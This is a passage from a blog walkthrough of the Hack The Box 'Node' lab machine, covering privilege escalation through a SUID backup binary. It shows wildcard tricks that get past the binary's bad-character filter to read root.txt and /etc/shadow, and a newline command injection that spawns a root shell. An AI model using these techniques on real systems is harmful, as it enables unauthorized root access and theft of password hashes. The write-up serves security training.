</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/59029171/139864597-4bcd48c8-fc94-4ed5-adb2-3e701b47c330.png" alt="image" data-proofer-ignore></p><p>Let us transfer the output to our local machine and analyze it. It looks like base64, and piping it out to a file and analyzing it tells it is a zip file. We can use the same password as last time to crack the zip and read the data.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>0xStarlight@kali<span class="nv">$ </span><span class="nb">cat </span>unknown | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> unknown.zip
0xStarlight@kali<span class="nv">$ </span>unzip unknown.zip
</pre></table></code></div></div><p>After extracting the file it gives us <code class="language-plaintext highlighter-rouge">root.txt</code> Let us read the content of the file.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>0xStarlight@kali<span class="nv">$ </span><span class="nb">cat </span>root.txt
</pre></table></code></div></div><p>Its a troll ! :( I guess its not that easy</p><p><img data-src="https://user-images.githubusercontent.com/59029171/139864757-cbf9c254-6bc3-4f3c-a1df-c6cbd6dc9df5.png" alt="image" data-proofer-ignore></p><p>Let us try it out again without <code class="language-plaintext highlighter-rouge">/</code> in <code class="language-plaintext highlighter-rouge">/root</code> while entering the parameter. I am just guessing and checking the result.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>tom@node:/<span class="nv">$ </span>backup <span class="nt">-q</span> a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 root
</pre></table></code></div></div><p>It has way more output this time. Let us do the same steps as before, extract the file and then read the file’s contents.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>0xStarlight@kali<span class="nv">$ </span>unzip decode.zip 
Archive:  decode1.zip
   creating: root/
<span class="o">[</span>decode1.zip] root/.profile password: 
  inflating: root/.profile           
  inflating: root/.bash_history      
   creating: root/.cache/
 extracting: root/.cache/motd.legal-displayed  
 extracting: root/root.txt           
  inflating: root/.bashrc            
  inflating: root/.viminfo           
   creating: root/.nano/
 extracting: root/.nano/search_history 
</pre></table></code></div></div><p>It looks like we have root.txt 🥳. But it’s not over yet. We don’t have a shell.</p><h2 id="wild-characters--path---ii-"><span class="mr-2">Wild Characters [ Path - II ]</span><a href="#wild-characters--path---ii-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Let’s transfer this file over to our local host machine and analyze the file on binaryninja. Open the main function in the disassembly Graph view.</p><p><img data-src="https://user-images.githubusercontent.com/59029171/139865028-4e57ef7f-e6b2-455d-b674-e867e17204f4.png" alt="image" data-proofer-ignore></p><p>After scrolling down, we can see that it has <code class="language-plaintext highlighter-rouge">/root</code> as a bad character, resulting in the troll ASCII Art.</p><p><img data-src="https://user-images.githubusercontent.com/59029171/139865161-f33b7c18-c33b-4262-bcd6-532d7458f508.png" alt="image" data-proofer-ignore></p><p><img data-src="https://user-images.githubusercontent.com/59029171/139865264-f5fb86e5-8cc5-4beb-8323-14412bbcd011.png" alt="image" data-proofer-ignore></p><p>Further Scrolling down, we can get a list of all the bad chars that it doesn’t allow.</p><ol><li><code class="language-plaintext highlighter-rouge">..</code></ol><p><img data-src="https://user-images.githubusercontent.com/59029171/139865415-a46ae779-2cec-40b4-adef-ec3d18a3bd8f.png" alt="image" data-proofer-ignore></p><p><img data-src="https://user-images.githubusercontent.com/59029171/139865468-55fbf2c1-d2a9-4888-95b2-7765e99029d5.png" alt="image" data-proofer-ignore></p><p>And if we go on doing this, we will find all the bad characters.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Bad chars : .. /root <span class="p">;</span> &amp; <span class="sb">`</span> <span class="nv">$ </span>| /etc // / etc
</pre></table></code></div></div><p>Looking at our bad chars list, we don’t have the <code class="language-plaintext highlighter-rouge">*</code> nor <code class="language-plaintext highlighter-rouge">~</code> sign. We can use this to bypass and read the <code class="language-plaintext highlighter-rouge">/root</code> directories files and content. For example, if we do the following command on our local machine.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cd</span> ~
<span class="nv">$ </span><span class="nb">cd </span>r<span class="k">**</span>t
<span class="nv">$ </span><span class="nb">cd </span>r??t
</pre></table></code></div></div><p>We will be returned to our home directory since there is no other directory it can get returned to. Hence we can read the root flag this way. Let us try it out.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>tom@node:/<span class="nv">$ </span>backup <span class="nt">-q</span> a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /r<span class="k">**</span>t/roo<span class="k">*</span>.txt
</pre></table></code></div></div><p>This gives us the <code class="language-plaintext highlighter-rouge">root.txt</code> file content.</p><p><img data-src="https://user-images.githubusercontent.com/59029171/139865761-c97250ba-3fd6-4f91-bb82-9d27ee9b8716.png" alt="image" data-proofer-ignore></p><p>We can do the same steps as privilege escalation 1 to extract the file and retrieve the flag. We can also try to read the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file and then try to crack it, then SSH as root on the machine.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>tom@node:/<span class="nv">$ </span>backup <span class="nt">-q</span> a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 <span class="s2">"/e*c/shado*"</span> <span class="p">;</span> <span class="nb">echo</span>
</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/59029171/139865901-ca96a5cf-d659-40ed-9cba-9387b0964570.png" alt="image" data-proofer-ignore></p><p>Extract the file by the same methods above, and then we can read the shadow file root hashes.</p><p><img data-src="https://user-images.githubusercontent.com/59029171/139865997-1d77c5fb-f166-425a-93ac-aa29f49f95c1.png" alt="image" data-proofer-ignore></p><h2 id="command-injection--path-iii-"><span class="mr-2">Command Injection [ Path-III ]</span><a href="#command-injection--path-iii-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Open the main function in the disassembly Graph view. Scroll down to the part where it executes the zip command if the parameters are correct.</p><p><img data-src="https://user-images.githubusercontent.com/59029171/139866091-6696b9e0-322d-4649-9c32-cb67cb1fb416.png" alt="image" data-proofer-ignore></p><p>Here we can see it has the exec command for zipping the data, and below that, we can also see that it calls the system; which means we might be able to do command injection on the third parameter with the help of a new line and get root and it is not a bad char as well. Now let us find out how we can do the command injection.</p><p>Open the main function in ELF Linear View. We can see a command which gets executed if we enter the correct magic word. It will zip the file content in base64 and display it to us on the screen.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="s2">"/usr/bin/zip -r -P magicword %s %s &gt; /dev/null"</span>
</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/59029171/139866253-4e69b27b-cf7f-40e7-b3c7-7b67ce5fd4c7.png" alt="image" data-proofer-ignore></p><p>As per the command, we can see it takes the last argument and pushes it to <code class="language-plaintext highlighter-rouge">/dev/null</code>. Hence, the command won’t execute it. So we can try to execute <code class="language-plaintext highlighter-rouge">/bin/bash</code> and get a root shell! We can do the command injection something like this.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>"randomblahbla
/bin/bash
randomblahba"
</pre></table></code></div></div><p>We can’t do command injection in the first parameter since it has a bad char check for <code class="language-plaintext highlighter-rouge">/</code> but not for the chars on a new line, and we can’t put it at the end as it will get flushed out to <code class="language-plaintext highlighter-rouge">/dev/null</code>.</p><p>Lets try it out</p><p><img data-src="https://user-images.githubusercontent.com/59029171/139866414-beaadd82-b2df-4113-a707-3b580d6d95c8.png" alt="image" data-proofer-ignore></p><p>WE ARE ROOT !!</p><h2 id="bof--path---iv-"><span class="mr-2">BOF [ Path - IV ]</span><a href="#bof--path---iv-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>A really good blog is written for this method of priv esc <a href="https://rastating.github.io/hackthebox-node-walkthrough/">https://rastating.github.io/hackthebox-node-walkthrough/</a></p><h1 id="box-rooted">Box Rooted</h1><p><img data-src="https://user-images.githubusercontent.com/59029171/139872271-6a94a1ef-8c16-4b60-9ce9-0405305b0257.png" alt="image" data-proofer-ignore></p><p>HTB Profile : <a href="https://app.hackthebox.com/profile/244565">0xStarlight</a></p><p>If you find my articles interesting, you can buy me a coffee</p><p><a href="https://www.buymeacoffee.com/0xStarlight"><img data-src="https://img.buymeacoffee.com/button-api/?text=Buy me an OSCP?&amp;emoji=&amp;slug=0xStarlight&amp;button_colour=b86e19&amp;font_colour=ffffff&amp;font_family=Poppins&amp;outline_colour=ffffff&amp;coffee_colour=FFDD00" data-proofer-ignore></a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/hackthebox-linux/'>Hackthebox-Linux</a>, <a href='/categories/hackthebox-medium/'>Hackthebox-Medium</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/nmap/" class="post-tag no-text-decoration" >nmap</a> <a href="/tags/nodejs/" class="post-tag no-text-decoration" >nodejs</a> <a href="/tags/crackstation/" class="post-tag no-text-decoration" >crackstation</a> <a href="/tags/source-code/" class="post-tag no-text-decoration" >source-code</a> <a href="/tags/password-reuse/" class="post-tag no-text-decoration" >password-reuse</a> <a href="/tags/bof/" class="post-tag no-text-decoration" >bof</a> <a href="/tags/command-injection/" class="post-tag no-text-decoration" >command-injection</a> <a href="/tags/wildcard/" class="post-tag no-text-decoration" >wildcard</a> <a href="/tags/reverse-engineering/" class="post-tag no-text-decoration" >reverse-engineering</a> <a href="/tags/binaryninja/" class="post-tag no-text-decoration" >binaryninja</a> <a href="/tags/oscp/" class="post-tag no-text-decoration" >OSCP</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Node - 0xStarlight&amp;url=https://0xstarlight.github.io/posts/HTB-Node-Writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Node - 0xStarlight&amp;u=https://0xstarlight.github.io/posts/HTB-Node-Writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://0xstarlight.github.io/posts/HTB-Node-Writeup/&amp;text=Hack The Box - Node - 0xStarlight" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Active-Directory-Domain-Persistence/">Active Directory - Domain Persistence</a><li><a href="/posts/Active-Directory-Lateral-Movement/">Active Directory - Lateral Movement</a><li><a href="/posts/Active-Directory-Introduction/">Active Directory - Introduction</a><li><a href="/posts/CRTE-Exam-Review/">CRTE Exam Review</a><li><a href="/posts/Bypassing-Windows-Defender/">Bypassing Windows Defender</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/amsi-bypass/">amsi-bypass</a> <a class="post-tag" href="/tags/password-reuse/">password-reuse</a> <a class="post-tag" href="/tags/acl-enumeration/">ACL-enumeration</a> <a class="post-tag" href="/tags/active-directory-domain-persistence/">active-directory-domain-persistence</a> <a class="post-tag" href="/tags/active-directory-enumeration/">active-directory-enumeration</a> <a class="post-tag" href="/tags/active-directory-introduction/">active-directory-introduction</a> <a class="post-tag" href="/tags/active-directory-lateral-movement/">active-directory-lateral-movement</a> <a class="post-tag" href="/tags/active-directory-local-privilege-escalation/">active-directory-local-privilege-escalation</a> <a class="post-tag" href="/tags/as-rep/">AS-REP</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTB-Shibboleth/"><div class="card-body"> <em class="timeago small" data-ts="1649128620" > 2022-04-05 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Shibboleth</h3><div class="text-muted small"><p> Shibboleth is about enumerating the UDP ports through which we can find IPMI service is running. We can dump the administrator hashes and log in to one of Shibboleth’s subdomains, where we can ge...</p></div></div></a></div><div class="card"> <a href="/posts/CRTE-Exam-Review/"><div class="card-body"> <em class="timeago small" data-ts="1689385980" > 2023-07-15 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CRTE Exam Review</h3><div class="text-muted small"><p> Introduction I am thrilled to announce that I have successfully passed the CRTE (Certified Red Team Expert) exam from Altered Security, and I am excited to share my journey and experience with a...</p></div></div></a></div><div class="card"> <a href="/posts/Bypassing-Windows-Defender/"><div class="card-body"> <em class="timeago small" data-ts="1684074600" > 2023-05-14 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Bypassing Windows Defender</h3><div class="text-muted small"><p> Introduction Greetings, everyone 👋. In this brief article, I will outline a manual obfuscation technique for bypassing Windows Defender. Specifically, I will cover how to patch the Antimalware S...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></span> <a href="/posts/Active-Directory-Introduction/" class="btn btn-outline-primary" prompt="Newer"><p>Active Directory - Introduction</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/Bhaskarpal__">Bhaskar Pal</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/amsi-bypass/">amsi-bypass</a> <a class="post-tag" href="/tags/password-reuse/">password-reuse</a> <a class="post-tag" href="/tags/acl-enumeration/">ACL-enumeration</a> <a class="post-tag" href="/tags/active-directory-domain-persistence/">active-directory-domain-persistence</a> <a class="post-tag" href="/tags/active-directory-enumeration/">active-directory-enumeration</a> <a class="post-tag" href="/tags/active-directory-introduction/">active-directory-introduction</a> <a class="post-tag" href="/tags/active-directory-lateral-movement/">active-directory-lateral-movement</a> <a class="post-tag" href="/tags/active-directory-local-privilege-escalation/">active-directory-local-privilege-escalation</a> <a class="post-tag" href="/tags/as-rep/">AS-REP</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-GZYBNZRQNP"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-GZYBNZRQNP'); }); </script>
